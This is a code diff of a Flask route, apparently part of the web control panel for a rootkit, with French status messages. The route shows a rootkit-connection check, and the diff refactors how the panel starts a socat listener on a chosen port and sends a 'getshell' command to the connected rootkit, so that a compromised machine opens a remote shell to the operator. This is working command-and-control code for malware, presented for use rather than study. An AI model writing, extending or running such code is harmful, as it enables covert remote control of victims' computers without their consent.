@@ -1,19 +1,17 @@
-import time
-import threading
 from flask import Blueprint, render_template, request, redirect, url_for
-from utils.tools import authenticated, rootkit_connection, connection_lock
-from utils.socat import run_socat_shell
+from utils.state import authenticated, rootkit_connection, connection_lock
+from utils.socat_launcher import run_socat_shell
+from utils.socket_comm import send_to_server
+import time
 
 shell_bp = Blueprint('shell', __name__)
 
-
-@shell_bp.route('/shell_remote', methods=['GET', 'POST'])
+@shell_bp.route('/', methods=['GET', 'POST'])
 def shell_remote():
     if not authenticated:
         return redirect(url_for('auth.login'))
 
     shell_output = ""
-
     if request.method == 'POST':
         port = request.form.get('port')
         try:
@@ -21,11 +19,11 @@ def shell_remote():
             if port < 1024 or port > 65535:
                 shell_output = "❌ Le port doit être entre 1024 et 65535."
             else:
-                threading.Thread(target=run_socat_shell, args=(port,)).start()
+                run_socat_shell(port)
                 time.sleep(1)
                 with connection_lock:
                     if rootkit_connection:
-                        rootkit_connection.sendall(f"getshell {port}\n".encode())
+                        send_to_server(rootkit_connection, f"getshell {port}")
                         shell_output = f"🚀 Shell distant lancé sur le port {port}."
                     else:
                         shell_output = "❌ Rootkit non connecté."
